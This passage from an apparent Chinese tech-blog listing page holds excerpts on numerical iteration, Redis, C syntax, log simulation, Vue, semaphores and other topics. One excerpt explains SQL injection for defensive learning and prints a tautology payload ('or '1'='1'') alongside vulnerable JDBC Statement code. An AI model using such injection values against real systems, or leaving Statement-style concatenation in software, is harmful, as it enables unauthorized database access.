以上迭代收敛较慢，迭代次数多，因此还可以使用超松弛迭代法。
1.3 超松弛迭代法
式中(1&lt;&lt;2)为加速收敛的因子，影响着迭代的收敛，
最佳收敛因子的经验公式
其中为每边的节点数减去1。
二、程序框图：
三、实验内容：
3.1内容及要求：
用高斯—赛德尔迭代法求解接地金属槽内点位分布，精度，行数M、列数N自己定义。
3.2 实验思路：
由超松弛迭代法，将网格分成M*N列，边界点正好都是网格的节点，对所有的节点进行编号，并记录节点的坐标位置，并用一个二维数组进行表示u1[M][N],此数组表示的是迭代后的值。考虑到迭代前后的数值不一样，再用一个二维数组表示迭代之前的数值u2[M][N]。
运用C++或MATLAB的知识在计算机上将边界值和内节点进行赋值，即将节点离散化。然后开始迭代。迭代开始之前将另一个数组b赋值，用数组a给其赋值，表示迭代之前的值，好用于后面精度的比较。开始进行迭代时，根据超松弛公式将迭代方程编写输入。每次迭代结束后将数组a和数组b对应的值进行比较，即是精度的计算。如果误差大于所规定的误差0.00001，将a的值赋给b，然后继续进行迭代。直到当迭代前后数值误差小于所规定的误差时停止迭代。并比较迭代因子的大小对收敛次数的影响，选取最烧收敛次数的迭代因子作为实验最后的输出结果。
最后输出最适合迭代因子、迭代的次数和迭代后各点的电位值。
3.3 编写程序
用C语言或MATLAB语言编写差分法程序，打印出迭代次数和每一点的电位值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cf42b7b8f2395d46c71c9bb7385f947/" rel="bookmark">
			Java|SpringBoot整合Redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 Jedis ✍数据操作事务操作JedisPool SpringBoot整合Redis ✍依赖自动配置配置类源码分析自定义RedisTemplate Jedis ✍ Jedis是一个高性能的开源Java客户端，是Redis官方推荐的Java开发工具。
创建一个maven项目，配置如下：
&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; cd 到pom所在文件夹下: mvn -f pom.xml dependency:copy-dependencies 数据操作 以下代码展示部分操作方式：
import org.junit.Test; import redis.clients.jedis.Jedis; import java.util.HashMap; import java.util.Map; public class JedisDemo { @Test public void operateString(){ System.out.println("-----------Jedis String 相关命令测试-----------"); Jedis jedis = new Jedis("xxx.xxx.xxx.xxx",6379); jedis.auth("xxxxx"); System.out.println("Jedis.ping():"+jedis.ping()); jedis.set("key0","123456"); System.out.println("jedis.get(key0)"+jedis.get("key0")); jedis.mset("key1","val1","key2","val2"); System.out.println("jedis.get(key*)"+jedis.keys("key*")); System.out.println("jedis.get(key1)):"+jedis.get("key1")); System.out.println("返回key的长度："+jedis.strlen("key0")); System.out.println("追加字符串："+jedis.append("key0","app")); System.out.println("打印key0:"+jedis.get("key0")); System.out.println("---------------------------------------------"); jedis.close(); } @Test public void operateList(){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cf42b7b8f2395d46c71c9bb7385f947/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60e3a5eef37c13f62d9249b6f675dda9/" rel="bookmark">
			c语言明码密码转换结构体,实现数据结构与算法需要掌握的C语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我使用C语言并不频繁，一般都是用来实现数据结构与算法，因为面向过程的编程方式容易理解算法的原理，但是呢，如果很长时间没写算法，那么就意味着C语言的某些语法就生疏了，但是总有那么一些，在写算法的时候，特别常用的，所以，我就专门写下来，不用再没头没脑的复习C语言了。
在提醒一下，这里只说C语言，不涉及C++。
声明普通变量
#include
int main()
{
int iVar = 10;
float fVar = 10.01;
double dVar = 10.001;
//bool flag = true;//C语言中没有bool类型
char cVar = 'a'; //字符类型使用单引号括起来
printf("%d\n", iVar);
printf("%f %f\n", fVar, dVar);
printf("%c\n", cVar);
printf("%s\n", NAME);
return 0;
}
声明指针
int *ptr = NULL; //这里请使用大写的NULL，小写的null不对
int a = 10;
ptr = &amp;a;
printf("%p %d\n", ptr, *ptr);
声明数组
//定义整型数组(浮点型是一样的)
int arrInt[10] = {1,2,3,4,5,6,7,8,9,10};
//也可不指定数组长度，长度会根据实际的元素个数来设置
int arrInt2[] = {9,8,7,6,5,4,3,2,1};
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60e3a5eef37c13f62d9249b6f675dda9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92c4e94171920f936f447f55e8afe6d8/" rel="bookmark">
			埋点/行为日志数据模拟生成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇目录：
目的
技术选构
日志生成
目的：
模拟真实业务数据，贴近实战项目
技术选构：
flume+hive
日志生成：
数据库数据准备
准备一个mysql服务器（注意，是在你的虚拟机的机器上，不是本地mysql），并创建一个库：realtimedw
2. 将realtimedw.sql这个脚本，导入到你的realtimedw库
3. 将t_md_areas.sql这个脚本，导入到你的realtimedw库
脚本执行完成后，建立了如下表结构
4.其他数据准备
5.修改配置文件（此两个配置文件在jar包【jar包在后面】中，可在本地windows环境下解压出来，修改完再丢回去）
other.properties
将相关位置、及账号密码改为自己对应的
# logger,kafkasink.type=logger#roll console dayrolllogger.type=dayrollinitdata.releasechannel=/root/loginit/releasechannel.txtinitdata.phoneinfo=/root/loginit/phoneinfo.txtinitdata.eventIds=/root/loginit/eventIds.txtinit.user.area=/root/loginit/area.txtdb.url=jdbc:mysql://127.0.0.1:3306/realtimedw?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=falsedb.user=rootdb.password=ABC123abc.123# max concurrent accessor amountonline.max.num=100 log4j.properties
# log4j.logger.roll = INFO,rollingFile# log4j.additivity.roll=false# log4j.appender.rollingFile=org.apache.log4j.RollingFileAppender# log4j.appender.rollingFile.Threshold=DEBUG# log4j.appender.rollingFile.ImmediateFlush=true# log4j.appender.rollingFile.Append=true# log4j.appender.rollingFile.File=/loggen/logdata/wx/event.log# log4j.appender.rollingFile.MaxFileSize=120MB# log4j.appender.rollingFile.MaxBackupIndex=50# log4j.appender.rollingFile.layout=org.apache.log4j.PatternLayout# log4j.appender.rollingFile.layout.ConversionPattern=%m%nlog4j.logger.dayroll = INFO,DailyRollinglog4j.additivity.dayroll=falselog4j.appender.DailyRolling=org.apache.log4j.DailyRollingFileAppenderlog4j.appender.DailyRolling.File=/loggen/logdata/wx/event_log_log4j.appender.DailyRolling.DatePattern=yyyy‐MM‐dd'.log'log4j.appender.DailyRolling.layout=org.apache.log4j.PatternLayoutlog4j.appender.DailyRolling.layout.ConversionPattern=%m%n 6、启动模拟器，生成数据
上传jar包，执行
执行命令
app端日志 执行此命令
java -cp log_gen_app.jar cn.doitedu.loggen.entry.GenAppLog 每天执行一次，执行之后，不用管它，大概1小时就ok；
每天执行的，即当天的数据，我生成好了三天的数据，如下图：
这就是我们日志埋点生成的的用户的行为日志数据，存储格式为json，存储地点在日志服务器。
更多学习、面试资料尽在微信公众号：Hadoop大数据开发 大数据学习/离线项目/实时项目/面试/内推 交流QQ群：139809179
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bade006c6722e3fe3792912fe4f3004/" rel="bookmark">
			vue创建项目时遇到问题：vue-cli · Failed to download repo vuejs-templates/webpack: read  ECONNRESET
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue-cli · Failed to download repo vuejs-templates/webpack: read ECONNRESET问题： 该问题翻译下来就是下载 C:\Users\ZHCS-WHW.vue-templates（路径根据实际情况有不同）这一路径下的webpack文件夹失败
1.原因：
webpack这个文件夹较大，在网络环境差或者不稳定的情况下，容易安装失败
2.解决方式：
可以多试几次，或者换个网络
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc779f9899ef6301ca9b03cb52c17d0c/" rel="bookmark">
			基于tkinter的简单相机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言功能模块思路核心代码完整代码总结： 前言 前一篇记录了一些常用tkinter控件及其使用方式，今天再次使用tkinter创建一个简易相机
功能 1.拍照 2.录像 所需工具： pycharm 2020.3.3 python 3.9 模块 os tkinter PIL cv2 threading tkinter.messagebox 思路 1.创建一个界面
2.添加一个Lable用来显示摄像头的画面
3.分别添加拍照，开始录像，结束录像按钮
4.设置视频或照片的格式
5.打开摄像头，经过处理画面显示到Lable上
6.完善拍照，录像功能
7.整体优化（方法有很多，例如使用类来优化）
核心代码 cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)#不加第二个参数，会出现错误，只要你不在意，可忽略 #每一帧的宽和高 cap.set(3, 640) cap.set(4, 480) 处理画面并且显示到Lable上，必须是灰度化之后的照片，通过fromarray(实现array到image的转换)转化，因为tkinter只能显示.gif的图片，所以要经过PhotoImage的处理才可，最后一句vidLabel.image = frame3不可少
while True: ret, frame = cap.read() frame1 = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) frame2 = Image.fromarray(frame1) frame3 = ImageTk.PhotoImage(frame2) vidLabel.configure(image=frame3) vidLabel.image = frame3 视频格式，VideoWriter的参数依次为：名称、编解码方式、帧率、画面大小
# # 指定视频编解码方式为MJPG 需要解码器 codec = cv2.VideoWriter_fourcc(*'MJPG') fps = 5 # 指定写入帧率为5 frameSize = (640, 480) # 指定窗口大小 # # 创建 VideoWriter对象 output = cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc779f9899ef6301ca9b03cb52c17d0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3300f63b6a7ad54ad1e6eb1c009fea9c/" rel="bookmark">
			C/c&#43;&#43;:语言中关键字typedef(类型重命名)、enum(整型常量值集合，代替#define)的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言–enum，typedef enum 枚举类型详解 1、typedef 关键字typedef来对类型重命名;
具体使用方法如下:
typedef（类型重定义:typedef unsigned int u_int;(用 u_int代替 unsigned int)
typedef double db; //将double重命名位db，就可以用db定义double数据类型 db b = 10.0; printf("%lf", b); 2、关键字enum的使用 : 枚举替代#define宏来定义常量 枚举（enum）通过一种简单的途径，把一串名字与一串整形值联系在一起。可以代替#define声明
关键字enum用来枚举常量；
enum SEX { MALE = 100, FEMALE, SECRET }; int a = MALE; int b = FEMALE; int c = SECRET; //默认值依次为0,1,2 //如果给 MALE 赋值100；下边的依次加一（ FEMALE 就变成了101） printf("%d\n", a);//100 printf("%d\n", b);//101 printf("%d\n", c);//102 (1) 枚举型是一个集合，集合中的元素(枚举成员)是一些命名的整型常量，元素之间用逗号,隔开。
(2) SEX 是一个标识符，可以看成这个集合的名字，是一个可选项，即是可有可无的项。
(3) 第一个枚举成员的默认值为整型的0，后续枚举成员的值在前一个成员上加1。
(4) 可以人为设定枚举成员的值，从而自定义某个范围内的整数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3300f63b6a7ad54ad1e6eb1c009fea9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0d5bc01a0f385f834a4a0c9a5f77a91/" rel="bookmark">
			SQL注入现象_实例总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL注入——了解🐎？ 本文主要内容：在通过使用基础的JDBC驱动连接数据库时，遇到的代码注入安全性问题。在初学的过程中大家会忽略的、值得注意的安全性问题做一个了解，同时总结学习去如何解决、避免这个基础的安全问题。
文章目录 SQL注入——了解🐎？前言一、SQ注入过程二、如何解决SQL注入总结 前言 SQL注入主要的概念 应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。
由上述定义可知，其实是数据库安全有关的问题（SQL注入可以理解为通过SQL语言的修改以达到获取数据库存储信息的安全危机）。
那不禁要思考了：
——在代码中为什么会发生这种现象？
——编程人员如何规避这种风险？
下面，我们就通过一些实例讲解其发生的原因以及相对应的解决办法。
一、SQ注入过程 首先，我们先看一个SQL语句：
select * from employees where password=‘tim’ or '1'='1'; 上述 SQL语句中【 or ‘1’=‘1’】只要在查询语句中，那么前面的 where 条件是没有用处的。
在数据库中，确实有这样的语句是可以进行查询的，但是如果操作数据库的是一名数据库管理人员，那么也没什么问题，如果只是有权限或无权限的访问数据库中相应的数据呢？
那么作为编程人员，我们不会直接与数据库打交道，我们最直接打交道的便是程序代码。那么我们进行操作数据库时，何时会发生这种现象呢？——在我们应用JDBC数据库驱动时，有创建数据库对象的相应操作。我们会通过数据库对象去执行相应的SQL语句以此来获取我们需要的数据。JDBC中有一个数据库操作对象 Statement 它在操作的时候就会出现SQL注入现象。
（使用JDBC驱动连接数据库的具体总结可以看这篇☞JDBC总结 ）
那么， Statement 为何会发生SQL注入现象呢？
下面我们就通过一个例子来了解一下。
Class.forName("com.mysql.jdbc.Driver"); // 2、 连接数据库 String url = "jdbc:mysql://localhost:3306/myemployees?autoReconnect=true&amp;serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=true"; String user = "root"; String password = "root"; conn = DriverManager.getConnection(url, user, password); // 3、创建数据库对象 stmt = conn.createStatement(); // 4、执行sql语句 String sql = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0d5bc01a0f385f834a4a0c9a5f77a91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/833c244926ca4b50cb2ad1e04f53c86e/" rel="bookmark">
			Batch Norm和Dropout问题大总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 为什么训练时要保证每层的方差一致?2. 什么是Covariate Shift现象？3. Batch Norm中为什么归一化后还要引入 γ \gamma γ和 β \beta β？4. Batch Norm训练和测试的区别5. 为什么Dropout后需要Rescale？6. dropout与Batch Norm联合使用会产生哪些问题？7. 如何减轻该状况？ 1. 为什么训练时要保证每层的方差一致? 每层的方差保持一致可以减缓梯度消失或爆炸。简单的说，神经网络的误差反向传播，忽略激活函数的偏导数时，相当于自后向前不停乘上网络每一层的权重。我们知道，对与一个任意张量，例如3， 当我们把它不停的乘上一个小于1的正数，那么最后结果就会越来越小，最后变成0。如果把一个数不停的乘上一个大于1的整数，结果就会变成无穷大。对于误差，也是这样，如果权重太大，梯度就会越来越大，导致梯度爆炸。如果网络权重太小，梯度就会越来愈小，导致梯度消失。权重初始化就是要使权重大小刚好在这个范围里。 合理的方差既保证了数值一定的不同, 又保证了数值一定的稳定。 因此，保证每层方差一致可以减缓梯度消失或爆炸。
2. 什么是Covariate Shift现象？ "Covariate Shift"可以理解为网络中间层的输入分布发生变化的现象。
假设这是一个识别猫的神经网络模型，并且我们已经在所有黑猫的图像上训练了数据(如左图所示)。但如果现在我们想把此网络应用于所有颜色的猫，此时网络可能就不会那么好用了。
如果你的训练数据分布是左图（红色圆圈为正例，黑色叉号表示反例），你想把从左图训练好的网络应用于右图的数据分布，那可能就需要重新训练神经网络了。这就是网络各层的输入分布发生了变化。归一化就是想解决因为数据分布的变化导致后面层难以训练的问题。
3. Batch Norm中为什么归一化后还要引入 γ \gamma γ和 β \beta β？ 减均值除方差得到的分布是正态分布，我们能否认为正态分布就是最好或最能体现我们训练样本的特征分布呢？
不能这样认为，如果激活函数在方差为1的数据上，没有表现最好的效果，比如Sigmoid激活函数。这个函数在-1~1之间的梯度变化不大。假如某一层学习到特征数据本身就分布在S型激活函数的两侧，把它归一化处理、标准差也限制在了1，把数据变换成分布于s函数的中间部分，就没有达到非线性变换的目的，换言之，减均值除方差操作后可能会削弱网络的性能。如果每一层的数据分布都是标准正太分布，导致其完全学习不到输入数据的特征，因为，费劲心思学习到的特征分布被归一化了，因此，直接对每一层做归一化显然是不合理的。
4. Batch Norm训练和测试的区别 在每个batch上进行而不是在整个数据集上进行。在训练集上有BN测试集上没有BN，这样不会发生数值上的偏移，道理类似dropout，即记录下训练集上的BN参数（均值、标准差、\beta、\gamma）作为网络参数的一部分。
训练阶段：
计算每一batch的mean和variance，然后归一化，放缩
测试阶段：
5. 为什么Dropout后需要Rescale？ 假设失活概率为 p ，就是某层中的每个神经元都有p的概率失活，而实际测试时是不会有dropout的，这样在训练和测试时，输出层每个神经元的输入和的期望会有量级上的差异。则会导致每次预测的结果都不一样。因此在训练时还要对隐藏层的输出数据除以（1-p）之后再传给输出层神经元，作为神经元失活的补偿，以使得在训练时和测试时每一层输入有大致相同的期望。训练时，对于网络中的某个输出值x，期望变为 ( 1 − p ) ∗ x + p ∗ 0 = ( 1 − p ) ∗ x (1-p)*x + p*0 = (1-p)*x (1−p)∗x+p∗0=(1−p)∗x, 为了保持测试时（没有dropout）期望一致，在训练时， 对包含dropout的输出乘 1 ( 1 − p ) \frac{1}{(1-p)} (1−p)1​, 使得期望仍然为 1 / ( 1 − p ) ∗ ( 1 − p ) x = x 1/(1-p) * (1-p)x = x 1/(1−p)∗(1−p)x=x。 因此，dropout后做rescale主要保证了神经元的期望均值与无dropout时一致，但未保证期望方差（标准差）一致。方差会产生一个与dropout系数p相关的偏移。所以dropout与bn联合使用可能会产生一定问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/833c244926ca4b50cb2ad1e04f53c86e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/321158547a03e8b07d9d7e757242281e/" rel="bookmark">
			Unity&#43;JetBrainsRider2020&#43;EmmyLua调试Lua（XLua）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JetBrainsRider2020安装EmmyLua 1.主界面安装插件EmmyLua Configure - 插件 - EmmyLua
2.设置界面安装EmmyLua 文件 - 设置 - 插件 - EmmyLua
添加JetBrainsRider调试器 按照上图添加调试器，复制代码到lua的初始化脚本脚本内。例如start.lua
断点调试 先启动unity，并且确保start.lua已经运行。
然后再断点lua脚本。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e399c1a5f20fd9b492446960704be4d2/" rel="bookmark">
			javax.management.InstanceAlreadyExistsException错误的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在搭建springcloud项目时，多个模块的项目同事启动，但是又两个模块的项目启动报错：javax.management.InstanceAlreadyExistsException；
百度了很多解决办法，说什么domain不可以一样，要在配置文件里添加 spring.jmx.domain的配置，试了也是不可以；
由于是在启动的时候报错，于是查看两个启动报错的启动类，发现启动类的入口方法SpringApplication.run方法多次执行了，导致报错。
解决方法：
springboot启动类中只保存一个SpringApplication.run方法；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e21d6753d913eed311d5b79adc86f5e/" rel="bookmark">
			信号量sem_init,sem_wait,sem_post
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章是信号量的简单入门，主要学习关于信号量四个函数的使用。 文章综合整理了两篇文章： http://blog.csdn.net/qyz_og/article/details/47189219 http://blog.csdn.net/ljianhui/article/details/10813469/ 在此一并感谢~
一、什么是信号量
线程的信号量与进程间通信中使用的信号量的概念是一样，它是一种特殊的变量，它可以被增加或减少，但对其的关键访问被保证是原子操作。如果一个程序中有多个线程试图改变一个信号量的值，系统将保证所有的操作都将依次进行。
而只有0和1两种取值的信号量叫做二进制信号量，在这里将重点介绍。而信号量一般常用于保护一段代码，使其每次只被一个执行线程运行。我们可以使用二进制信号量来完成这个工作。
二、信号量的接口函数
信号量的函数都以sem_开头，线程中使用的基本信号量函数有4个，它们都声明在头文件semaphore.h中。
sem_init函数
该函数用于创建信号量，其原型如下：
int sem_init(sem_t *sem,int pshared,unsigned int value); 该函数初始化由sem指向的信号对象，设置它的共享选项，并给它一个初始的整数值。 pshared控制信号量的类型，如果其值为0，就表示这个信号量是当前进程的局部信号量，否则信号量就可以在多个进程之间共享，value为sem的初始值。调用成功时返回0，失败返回-1.
sem_wait函数
该函数用于以原子操作的方式将信号量的值减1。原子操作就是，如果两个线程企图同时给一个信号量加1或减1，它们之间不会互相干扰。它的原型如下：
int sem_wait(sem_t *sem); sem_post函数
该函数用于以原子操作的方式将信号量的值加1。它的原型如下：
int sem_post(sem_t *sem); 与sem_wait一样，sem指向的对象是由sem_init调用初始化的信号量。调用成功时返回0，失败返回-1.
sem_destroy函数
该函数用于对用完的信号量的清理。它的原型如下：
int sem_destroy(sem_t *sem); 成功时返回0，失败时返回-1.
三、信号量的函数使用 代码： #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;pthread.h&gt; #include &lt;semaphore.h&gt; sem_t sem; void func1(void* arg) { sem_wait(&amp;sem); int *running=arg; printf("thread running1\n"); printf("%d\n",*running); } void func2(void* arg) { printf("pthread2 running\n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e21d6753d913eed311d5b79adc86f5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65adc9ce5fc1aa0bf5519573c311e335/" rel="bookmark">
			c语言编程分离个十百千位,C语言编程之|如何分离一个多位数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本订阅号致力于单片机、ARM等嵌入式软硬件的设计经验分享，秉承“人人都是电子设计经验的分享者”的理念，成功路上不孤单，我们一起努力。公众号：micropoint8
数码管是电子设计之中最常用的显示元器件，但是数码管一次只能显示一个数字，如果要显示多位数字只能使用多个数码管并且要把数字拆分开，一位一位的送到数码管中才能显示，今天就介绍把一个多位数字拆分的方法。
把一个多位数拆分要用到两个运算符“/”除法运算符和“%”取余运算符：
/：得到的运算结果是整数，68/10=6；
%：得到的运算结果是余数，68%10=8；
是不是有点意思。
比如要显示524这个三位数，下面讲解这个数字的拆分算法。
百位：524/100 = 5；
十位：524%100=24；24/10=2；
各位：524%100=24；24%10=4；
通过这个例子是不是找出规律来了？简写入下：
百位：524/100 = 5；
十位：524%100/10=2；
各位：524%100%10=4；
再举一个四位数的例子，拆分6893如下：
千位：6893/1000=6；
百位：6893%1000/100 = 8；
十位：6893%1000%100/10 = 9；
各位：6893%1000%100%10 = 3；
是不是分离出来了？这时候就可以把数据送到数码管显示了。
以上分离方法只是众多分离方法中的一种，在使用的时候可以在纸上简单算一下，结果就很容易出来了。想要了解数码管是如何工作的，请点击这里。
本订阅号致力于单片机、ARM等嵌入式软硬件的设计经验分享，秉承“人人都是电子设计经验的分享者”的理念，成功路上不孤单，我们一起努力。公众号：micropoint8
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f2725959d151dcf8f3788ea732b5724/" rel="bookmark">
			Vue2的router-view中子组件与父组件传值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，子主件触发向父主件传值 子组件与父组件传值是通过在子组件中，定义$emit，向父组件发射一个事件，及带上传的值。父组件监听这个事件，然后调用这个事件的函数，传值是传到这个函数参数中的。
this.$emit('changeActiveStep',3); 事件名：changeActiveStep
传值：3
具体如下：
场景是：app.vue中定义一个展示当前进度的变量，
这个值随着app.vue 中router-view跳转到component1，值表示为第1步，跳转到component2，值表示为第2步
实现为：
1，在app.vue中
&lt;router-view @changeActiveStep="changeStep"&gt;&lt;/router-view&gt; 定义事件changeActiveStep调用的函数changeStep
在app.vue中组件的methods中定义函数：
methods:{ changeStep(val){ this.active_step=val } } 当然，我们也可以在这个组件中data中定义active_step初始值：
data(){ return { active_step:2 } 2，子组件中定义emit发射事件
this.$emit('changeActiveStep',3); 因为我们跳转到某个component中就自动变化active_step值，所以，在跳转到的component中，我是在mounted中定义$emit调用的
以上基本实现，跳转到子组件，子组件改变父组件的值的功能
2，父主件主动取子组件值 父组件主动取子主件值，使用ref
调用子组件
&lt;subComp :show-data="template_res" ref="child"/&gt; 取值方式为：
console.log("showData:",this.$refs.child.checked_showData) 另外一种写法中：
&lt;!-- &lt;div v-for="(val,k,ind) in resp_data" :key="ind" &gt; &lt;ShowMonitoritems :title="check_titles[k]" :show-data="val" :ref="k"/&gt; &lt;/div&gt; --&gt; 使用的**:ref**(加点的)，因为k是v-for产生的
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c6e2dfe2b0907f3602c246467bdcabb/" rel="bookmark">
			进程间通信（IPC）介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.为什么需要进程间通信 1).数据传输
一个进程需要将它的数据发送给另一个进程。
2).资源共享
多个进程之间共享同样的资源。
3).通知事件
一个进程需要向另一个或一组进程发送消息，通知它们发生了某种事件。
4).进程控制
有些进程希望完全控制另一个进程的执行(如Debug进程)，该控制进程希望能够拦截另一个进程的所有操作，并能够及时知道它的状态改变。
注：为什么要用进程，不用进程？ 线程快？进程安全？线程的创建与销毁消耗资源小？
二.什么是进程间通信 首先了解几个名词：
1. 进程隔离
进程隔离是为保护操作系统中进程互不干扰而设计的一组不同硬件和软件的技术。这个技术是为了避免进程A写入进程B的情况发生。 进程的隔离实现，使用了虚拟地址空间。进程A的虚拟地址和进程B的虚拟地址不同，这样就防止进程A将数据信息写入进程B。
2.虚拟地址空间
就32位系统而言，当创建一个进程时，操作系统会为该进程分配一个 4GB 大小的虚拟进程地址空间。之所以是 4GB ，是因为在 32 位的操作系统中，一个指针长度是 4 字节，而 4 字节指针的寻址能力是从 0x00000000~0xFFFFFFFF ，最大值 0xFFFFFFFF 表示的即为 4GB 大小的容量。与虚拟地址空间相对的，还有一个物理地址空间，这个地址空间对应的是真实的物理内存。要注意的是这个 4GB 的地址空间是“虚拟”的，并不是真实存在的，而且每个进程只能访问自己虚拟地址空间中的数据，无法访问别的进程中的数据，通过这种方法实现了进程间的地址隔离。
针对 Linux 操作系统，将最高的1G字节（从虚拟地址 0xC0000000 到 0xFFFFFFFF ）供内核使用，称为内核空间，而较低的 3G 字节（从虚拟地址 0x00000000 到0xBFFFFFFF），供各个进程使用，称为用户空间。每个进程都可以通过系统调用进入到内核。其中在 Linux 系统中，进程的用户空间是独立的，而内核空间是共有的，进程切换时，用户空间切换，内核空间不变。
创建虚拟地址空间目的是为了解决进程地址空间隔离的问题。但程序要想执行，必须运行在真实的内存上，所以，必须在虚拟地址与物理地址间建立一种映射关系。这样，通过映射机制，当程序访问虚拟地址空间上的某个地址值时，就相当于访问了物理地址空间中的另一个值。人们想到了一种分段、分页的方法，它的思想是在虚拟地址空间和物理地址空间之间做一一映射。这种思想理解起来并不难，操作系统保证不同进程的地址空间被映射到物理地址空间中不同的区域上，这样每个进程最终访问到的物理地址空间都是彼此分开的。通过这种方式，就实现了进程间的地址隔离。
进程间通信（IPC，InterProcess Communication）是指在不同进程之间传播或交换信息。
注：同时在不同终端运行同一个bin文件，不同终端的bin文件在运行时有什么是相同的？
三.IPC通信原理 每个进程各自有不同的用户地址空间，任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程1把数据从用户空间拷到内核缓冲区,进程2再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信机制。通常的做法是消息发送方将要发送的数据存放在内存缓存区中，通过系统调用进入内核态。然后内核程序在内核空间分配内存，开辟一块内核缓存区，内核空间调用 copy_from_user() 函数将数据从用户空间的内存缓存区拷贝到内核空间的内核缓存区中。同样的，接收方进程在接收数据时在自己的用户空间开辟一块内存缓存区，然后内核程序调用 copy_to_user() 函数将数据从内核缓存区拷贝到接收进程的用户空间内存缓存区。这样数据发送方进程和数据接收方进程就完成了一次数据传输，我们称完成了一次进程间通信。
主要的过程如下图所示：
四.通信方式 IPC的方式通常有linux下的 管道（Streams)（包括无名管道和命名管道）、消息队列、信号量、信号、共享存储、Socket等。其中 Socket和Streams支持不同主机上的两个进程IPC，以及android下的Binder。
以Linux中的C语言编程为例。
一、管道 管道，通常指无名管道，是 UNIX 系统IPC最古老的形式。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c6e2dfe2b0907f3602c246467bdcabb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc44eaa344ec418178ac0529b4696a17/" rel="bookmark">
			作为一名Java开发者应该掌握的基础知识汇总！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java语言作为热门编程语言之一，受到了更多的欢迎。今天小千就为大家介绍一下作为一名Java开发者应该掌握的基础知识。
一、修饰符 java语言中提供了一些修饰符，这些修饰符可以修饰类，变量和方法。
以下是常用的一些常用的修饰符：
二、8种基本数据类型 Java把数据类型分为基本数据类型和引用数据类型。
三、变量 1、字符变量的特殊使用
